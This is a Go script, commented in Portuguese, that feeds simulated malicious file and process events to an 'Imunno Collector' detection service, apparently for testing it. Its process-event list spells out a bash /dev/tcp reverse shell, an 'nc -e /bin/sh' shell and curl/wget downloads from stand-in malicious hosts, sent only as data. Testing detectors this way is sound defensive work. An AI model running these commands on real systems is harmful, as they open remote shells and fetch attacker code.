// simulador.go
// Script para simular eventos maliciosos no Imunno Collector com arquivos reais, logs e limpeza

package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"time"
)

type FileEvent struct {
	AgentID          string    `json:"agent_id"`
	Hostname         string    `json:"hostname"`
	FilePath         string    `json:"file_path"`
	FileHashSHA256   string    `json:"file_hash_sha256"`
	ThreatScore      int       `json:"threat_score"`
	AnalysisFindings []byte    `json:"analysis_findings"`
	IsWhitelisted    bool      `json:"is_whitelisted"`
	QuarantinedPath  string    `json:"quarantined_path"`
	Timestamp        time.Time `json:"timestamp"`
	Content          string    `json:"content,omitempty"`
}

type ProcessEvent struct {
	AgentID     string    `json:"agent_id"`
	Hostname    string    `json:"hostname"`
	Timestamp   time.Time `json:"timestamp"`
	ProcessID   int32     `json:"process_id"`
	ParentID    int32     `json:"parent_id"`
	Command     string    `json:"command"`
	Username    string    `json:"username"`
	ThreatScore int       `json:"threat_score"`
}

var logFile *os.File

func initLog() {
	var err error
	logFile, err = os.OpenFile("simulador.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatalf("Erro ao criar arquivo de log: %v", err)
	}
	log.SetOutput(logFile)
}

func generateMaliciousContent(ext string) string {
	switch ext {
	case "php":
		return "<?php eval(base64_decode('ZWNobyAnaGVsbG8nOw==')); ?>"
	case "js":
		return "eval(atob('YWxlcnQoJ2hlbGxvJyk='));"
	default:
		return "normal text file"
	}
}

func writeTempMaliciousFile(ext string) (string, string, string) {
	filePath := fmt.Sprintf("/tmp/simulacao_%d.%s", rand.Intn(99999), ext)
	content := generateMaliciousContent(ext)
	_ = os.WriteFile(filePath, []byte(content), 0644)

	hash := sha256.Sum256([]byte(content))
	hashStr := hex.EncodeToString(hash[:])

	return filePath, hashStr, content
}

func sendFileEvent(ext string) {
	filePath, hash, content := writeTempMaliciousFile(ext)
	defer os.Remove(filePath)

	payload := FileEvent{
		AgentID:          "sim-agent-001",
		Hostname:         "sim-host",
		FilePath:         filePath,
		FileHashSHA256:   hash,
		ThreatScore:      0,
		AnalysisFindings: []byte(`[]`),
		IsWhitelisted:    false,
		Timestamp:        time.Now(),
		Content:          content,
	}

	jsonData, _ := json.Marshal(payload)
	resp, err := http.Post("http://imunno_collector:8080/v1/events/file", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("[ERRO] Arquivo %s: %v", filePath, err)
		return
	}
	defer resp.Body.Close()
	log.Printf("[ARQUIVO] %s | Status: %s", filePath, resp.Status)
	fmt.Println("[Arquivo] Enviado:", filePath, "| Status:", resp.Status)
}

func sendProcessEvent() {
	comandos := []string{
		"/bin/bash -i >& /dev/tcp/10.0.0.1/1234 0>&1",
		"curl http://malicious-site.com/payload.sh",
		"nc -e /bin/sh 10.0.0.1 4444",
		"python -c 'import os'",
		"wget http://bad-domain.net/script.js",
	}
	cmd := comandos[rand.Intn(len(comandos))]

	payload := ProcessEvent{
		AgentID:     "sim-agent-001",
		Hostname:    "sim-host",
		Timestamp:   time.Now(),
		ProcessID:   int32(rand.Intn(5000)),
		ParentID:    int32(rand.Intn(5000)),
		Command:     cmd,
		Username:    "www-data",
		ThreatScore: 0,
	}

	jsonData, _ := json.Marshal(payload)
	resp, err := http.Post("http://imunno_collector:8080/v1/events/process", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("[ERRO] Processo %s: %v", cmd, err)
		return
	}
	defer resp.Body.Close()
	log.Printf("[PROCESSO] %s | Status: %s", cmd, resp.Status)
	fmt.Println("[Processo] Enviado:", cmd, "| Status:", resp.Status)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	initLog()
	defer logFile.Close()

	var count int
	var delay int
	var modoAtaque bool
	flag.IntVar(&count, "n", 5, "Quantidade de eventos de cada tipo a simular")
	flag.IntVar(&delay, "delay", 2, "Delay entre eventos (segundos)")
	flag.BoolVar(&modoAtaque, "massivo", false, "Simula ataque massivo (sem delay)")
	flag.Parse()

	extensoes := []string{"php", "js", "txt"}

	fmt.Println("--- Simulador de Ameaças Ativado ---")
	log.Println("Iniciando simulação com", count, "eventos por tipo")

	for i := 0; i < count; i++ {
		sendFileEvent(extensoes[rand.Intn(len(extensoes))])
		sendProcessEvent()
		if !modoAtaque {
			time.Sleep(time.Duration(delay) * time.Second)
		}
	}

	fmt.Println("--- Simulação concluída ---")
	log.Println("Simulação encerrada")
}
